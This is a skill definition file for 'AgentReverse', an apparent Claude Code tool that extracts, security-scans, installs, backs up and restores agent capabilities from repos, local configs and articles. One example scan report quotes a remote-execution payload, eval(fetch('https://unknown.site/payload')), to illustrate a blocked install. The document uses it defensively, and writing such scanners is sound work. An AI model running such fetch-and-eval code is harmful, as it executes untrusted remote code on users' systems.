---
name: agent-reverse
description: Reverse engineer and extract capabilities from any source — repos, local configs, binaries, articles, settings — into your agent workflow
---

# AgentReverse

Reverse engineering engine for agent capabilities. Extracts, analyzes, and installs skills and tools from any source: GitHub repos, local Claude Code settings, installed binaries, articles, or raw configs. Prevents bloat by installing only what you need.

## Core Principle

AgentReverse can reverse engineer **anything the user points it at**. Don't limit yourself to GitHub URLs. If the user says "look at my hooks" or "what does this binary do" or "extract a skill from this config" — figure it out.

**Input detection:**
- GitHub URL → repo workflow (clone → analyze → extract)
- Local file path → direct file analysis
- `local` / `my settings` / `my config` → local introspection (`local_scan`)
- Article URL → web synthesis (`web_interpret`)
- No source specified → scan current environment and suggest improvements

## Commands

### `/agent-reverse analyze <source>`

Analyze any source for extractable capabilities.

**Source types:**
- `<github-url>` — clone and analyze a repo
- `<file-path>` — analyze a local file or directory
- `local` — scan your entire Claude Code environment
- `<article-url>` — extract capabilities from a web article

**Steps (GitHub repo):**
1. Call `repo_fetch` with the URL
2. Call `repo_analyze` on the cloned path
3. Present capabilities found (skills, tools, plugins)
4. For each, indicate if `user-invocable: true` (slash command) or agent-only
5. Ask user which to install
6. Call `repo_cleanup` when done

**Steps (local environment):**
1. Call `local_scan` to build/refresh the environment snapshot
2. Present what's installed: skills, commands, hooks, MCP servers, settings
3. Call `local_optimize` to detect issues (dead skills, deprecated configs, missing hooks)
4. Present optimization recommendations
5. Auto-apply safe fixes (after backup), prompt for breaking changes

**Steps (local file/directory):**
1. Read the file or scan the directory
2. Parse for skill frontmatter, MCP tool definitions, config patterns
3. Present what was found
4. Offer to install or adapt into agent workflow

**Steps (article URL):**
1. Call `web_fetch` to extract content
2. Call `web_interpret` to synthesize capabilities
3. Present extracted skills/patterns
4. Ask user which to install

**Example (repo):**
```
User: /agent-reverse analyze https://github.com/anthropics/claude-code-plugins
You: Found 5 capabilities, 2 MCP tools:
  1. code-review — Review PRs [/command]
  2. test-runner — Run tests [/command]
  3. helper-utils — Internal utilities [agent-only]
Which to install?
```

**Example (local):**
```
User: /agent-reverse analyze local
You: Scanned Claude Code environment:
  12 skills (2 dead — never referenced), 3 hooks, 2 MCP servers (1 unreachable)
  Settings: 1 deprecated key found (allowedTools → permissions.allow)
  Auto-fixed: renamed deprecated setting. Removed 2 dead skills.
  Needs review: MCP server 'context7' not responding — remove?
```

**Example (file):**
```
User: /agent-reverse analyze ~/.cursor/rules/my-rule.mdc
You: Found Cursor rule with 3 extractable patterns. Convert to Claude Code skill?
```

### `/agent-reverse install <id>`

Install a capability from a previously analyzed source.

**Steps:**
1. Verify source is still available (re-fetch repo if needed, re-read file if local)
2. **Security scan** — run `security_scan` on the capability before writing anything
   - CRITICAL findings (remote exec, data exfil) → block install, show report, require `--force` to override
   - MEDIUM findings (secret access, persistence) → show findings, ask user to confirm
   - LOW findings (destructive ops, obfuscation) → show in report, proceed
3. **Determine user-invocable status:**
   - Source has `user-invocable: true` → install as `/command`
   - Source doesn't specify → ask: "Install as `/command` or agent-only skill?"
4. Call `install_capability` with appropriate settings
5. Report: files written, directory, whether `/command` is available

**Example (clean install):**
```
User: /agent-reverse install code-review
You: Security scan: clear (0/10 risk).
  Installed code-review → .claude/commands/code-review.md
  Available as /code-review. Added to manifest.
```

**Example (security finding):**
```
User: /agent-reverse install sketchy-tool
You: Security scan found issues:
  [CRITICAL] Remote execution — line 15: eval(fetch('https://unknown.site/payload'))
  Install blocked. Use --force to override (not recommended).
```

### `/agent-reverse sync`

Reinstall all capabilities from the manifest.

**Steps:**
1. Call `manifest_sync`
2. Report installed/failed/skipped counts
3. List failures with error messages

**Use case:** New environment setup or recovery after cleanup.

**Example:**
```
User: /agent-reverse sync
You: Synced 5 capabilities. 5 installed, 0 failed, 1 skipped (superseded).
```

### `/agent-reverse audit`

Check for bloat, duplicates, security issues, and optimization opportunities across your entire setup.

**Steps:**
1. Call `local_scan` to refresh environment state
2. Call `manifest_list` for tracked capabilities
3. Scan local skills directory for untracked files
4. Identify duplicates, dead skills, deprecated configs
5. Report findings and suggest actions

**Example:**
```
User: /agent-reverse audit
You: 12 skills installed (3 untracked), 2 potential duplicates.
  Dead: helper-utils (never referenced). Deprecated: 1 setting.
  MCP servers: 2 healthy, 1 unreachable.
```

### `/agent-reverse check-updates`

Check if installed capabilities have newer versions, and check if Claude Code itself has updated.

**Steps:**
1. Call `manifest_check_updates` for capability versions
2. Call `changelog_check` for Claude Code version changes
3. List outdated items and any pending migrations
4. Offer to update

**Example:**
```
User: /agent-reverse check-updates
You: Capabilities: 2 outdated (code-review, test-runner).
  Claude Code: updated 2.1.39 → 2.1.40.
    Auto-applied: renamed deprecated setting.
    Needs review: new maxTokens default changed.
  Update capabilities?
```

### `/agent-reverse backup [options]`

Create a backup of all capabilities, skills, and configs.

**Steps:**
1. Call `backup_create` with options:
   - No options: saves to `agent-reverse-backup-<date>.json`
   - `--gist`: upload to GitHub Gist (private by default)
   - `--gist --public`: upload as public gist
   - `--repo owner/name`: push to GitHub repo
2. Report backup location and file count

**Example:**
```
User: /agent-reverse backup --gist
You: Backup uploaded: https://gist.github.com/user/abc123 (11 capabilities, 16 files)
```

### `/agent-reverse restore <source>`

Restore capabilities from a backup.

**Steps:**
1. Call `backup_list` to preview contents
2. Show what will be restored
3. Call `backup_restore` with options:
   - `source`: local path, gist URL, or repo URL
   - `--merge`: merge with existing (default: replace)
   - `--dry-run`: preview without writing
   - `--target <agent>`: cross-agent restore (claude-code, cursor, antigravity)
4. Report restored files

**Example:**
```
User: /agent-reverse restore https://gist.github.com/user/abc123 --target cursor
You: Cross-agent restore: claude-code → cursor. Restored 8 capabilities.
```

### `/agent-reverse backup-list <source>`

Preview backup contents without restoring.

**Steps:**
1. Call `backup_list` with the source path/URL
2. Display capability list and file count

**Example:**
```
User: /agent-reverse backup-list ./backup.json
You: 11 capabilities, 16 files. Created: 2026-01-31.
```

## Security Scanning

Every `install_capability` call is gated by `security_scan`. The scanner checks six dimensions using pattern matching (no LLM cost):

| Category | Severity | Action |
|---|---|---|
| Remote execution | CRITICAL | Block install |
| Data exfiltration | CRITICAL | Block install |
| Secret access | MEDIUM | Warn + confirm |
| Persistence | MEDIUM | Warn + confirm |
| Destructive ops | LOW | Info only |
| Obfuscation | LOW | Info only |

Users can override CRITICAL blocks with `--force`. Don't recommend it.

## Changelog Awareness

On session start, `changelog_check` runs automatically:
1. Compare `claude --version` against cached version
2. If unchanged → zero cost, no output
3. If updated → fetch changelog from npm + GitHub, parse changes, apply safe migrations, present breaking changes for approval

Migration rules are stored in `migration-rules.json` (static rules for known changes, LLM fallback for unknown entries).

## Target Agent Detection

Detect the current agent system:
- `.claude/` exists → `claude-code`
- `.cursor/` exists → `cursor`
- `.agent/` exists → `antigravity`
- Otherwise → ask user

## Tips

- Pin to specific commits for reproducibility
- Run `audit` periodically to keep your setup lean
- The manifest (`agent-reverse.json`) is portable — copy to new environments and `sync`
- `analyze local` is the quickest way to health-check your Claude Code setup
- Security scan runs automatically — you don't need to think about it
